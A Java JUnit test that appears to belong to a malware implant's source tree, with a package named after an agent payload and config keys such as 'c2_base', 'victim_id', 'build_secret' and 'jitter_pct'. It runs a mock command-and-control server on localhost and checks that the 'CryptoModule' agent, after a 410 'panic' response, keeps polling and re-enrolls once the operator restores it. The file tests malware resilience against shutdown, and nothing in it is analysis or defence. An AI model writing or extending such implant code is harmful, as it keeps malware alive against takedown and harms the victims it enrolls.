package com.spcagentpayloa.jvmxx.crypto;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;

import static org.junit.jupiter.api.Assertions.assertTrue;

/** A 410 must not park the agent forever: restore has to be picked up. */
class PanicRecoveryTest {
	@TempDir
	Path temp;

	@Test
	void theAgentReenrollsAfterRestore() throws Exception {
		AtomicBoolean restored = new AtomicBoolean();
		AtomicBoolean saw410 = new AtomicBoolean();
		AtomicBoolean healthy = new AtomicBoolean();
		String token = CryptoUtil.b64url(CryptoUtil.random(32));
		String salt = CryptoUtil.b64url(CryptoUtil.random(32));
		java.util.concurrent.atomic.AtomicInteger enrolls = new java.util.concurrent.atomic.AtomicInteger();

		HttpServer server = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
		server.createContext("/api/v1/enroll", exchange -> {
			read(exchange);
			if (enrolls.getAndIncrement() > 0 && !restored.get()) {
				respond(exchange, 403, "{\"error\":\"build_revoked\"}");
				return;
			}
			String body = "{\"victim_id\":\"00000000-0000-4000-8000-000000000002\","
				+ "\"device_token\":\"" + token + "\",\"artifact_scheme\":2,\"key_epoch\":1,"
				+ "\"key_salt\":\"" + salt + "\",\"identity_state\":\"confirmed\"}";
			respond(exchange, 201, body);
		});
		server.createContext("/api/v1/hb", exchange -> {
			read(exchange);
			if (!restored.get()) {
				saw410.set(true);
				respond(exchange, 410, "{}");
				return;
			}
			healthy.set(true);
			respond(exchange, 200, "{}");
		});
		server.createContext("/api/v1/tasks", exchange -> {
			read(exchange);
			respond(exchange, 200, "{\"tasks\":[]}");
		});
		server.start();
		CryptoModule module = null;
		try {
			Map<String, Object> map = new LinkedHashMap<>();
			map.put("build_id", "00000000-0000-4000-8000-000000000001");
			map.put("build_secret", Base64.getUrlEncoder().withoutPadding().encodeToString(CryptoUtil.random(32)));
			map.put("c2_base", "http://127.0.0.1:" + server.getAddress().getPort() + "/api/v1");
			map.put("artifact_scheme", 2L);
			map.put("heartbeat_sec", 10L);
			map.put("poll_sec", 10L);
			map.put("jitter_pct", 0L);
			CryptoConfig config = new CryptoConfig(map);
			Path install = Files.createDirectories(temp.resolve("install"));
			module = new CryptoModule(install, install, config, null);
			module.start();

			long deadline = System.currentTimeMillis() + 30_000L;
			while (!saw410.get() && System.currentTimeMillis() < deadline) Thread.sleep(100L);
			assertTrue(saw410.get(), "the 410 was received");
			restored.set(true);
			while (!healthy.get() && System.currentTimeMillis() < deadline) Thread.sleep(100L);
			assertTrue(healthy.get(), "the agent sent a heartbeat after restore");
			assertTrue(module.enabled(), "the loops stayed alive and re-enrolled");
		} finally {
			if (module != null) module.stop();
			server.stop(0);
		}
	}

	private static void read(HttpExchange exchange) throws IOException {
		exchange.getRequestBody().readAllBytes();
	}

	private static void respond(HttpExchange exchange, int status, String body) throws IOException {
		byte[] bytes = body.getBytes(StandardCharsets.UTF_8);
		exchange.getResponseHeaders().set("Content-Type", "application/json");
		exchange.sendResponseHeaders(status, bytes.length);
		exchange.getResponseBody().write(bytes);
		exchange.close();
	}
}
